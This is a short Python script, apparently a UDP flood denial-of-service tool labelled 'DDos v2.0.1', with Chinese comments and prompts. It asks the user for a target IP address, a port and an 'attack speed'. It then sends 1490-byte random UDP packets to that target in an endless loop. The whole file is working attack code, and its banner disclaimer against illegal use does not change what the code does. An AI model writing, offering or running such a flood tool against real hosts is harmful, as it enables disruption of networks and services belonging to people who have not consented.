import socket
import time
import random
import os


os.system("clear")
os.system("figlet DDos")
print(" ____________") 
print("|   ddos    |")
print("|  v2.0.1   |")
print("| 作者hcymc |")
print("|___________|")
print("|请勿用于非法用途|")
def send_packets(ip, port, speed):
    # 创建一个UDP套接字
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    # 设置套接字超时时间
    s.settimeout(1)

    # 生成随机数据包
    sj = random._urandom(1490)

    sl = 0  # 记录发送的数据包数量

    try:
        while True:
            # 发送数据包到指定的IP和端口
            s.sendto(sj, (ip, port))
            sl += 1
            # 打印发送成功的消息
            print("已成功发送{}个数据包到{}:{}".format(sl, ip, port))

            #暂停一段时间，控制发送速度
            time.sleep(1 / speed)

    except KeyboardInterrupt:
        # 用户按下Ctrl+C时关闭套接字
        print("\n程序已终止")
        s.close()

def main():

    while True:
        ip = input("请输入目标IP地址：")
        port = int(input("请输入目标端口号："))
        speed = float(input("请输入攻击速度（包/秒）："))

        # 验证IP地址的格式是否正确
        is_valid_ip = all(part.isdigit() and 0 <= int(part) <= 255 for part in ip.split('.'))
        if is_valid_ip:
            time.sleep(0.5)
            print("[+] IP地址格式正确")
        else:
            time.sleep(0.5)
            print("[-] IP地址格式错误")

        # 验证端口号是否正确
        if port <= 65535 and port >= 0:
            time.sleep(0.5)
            print("[+] 端口号输入正确")
        else:
            time.sleep(0.5)
            print("[-] 端口号输入错误")
            continue

        send_packets(ip, port, speed)
        break

if __name__ == "__main__":
    main()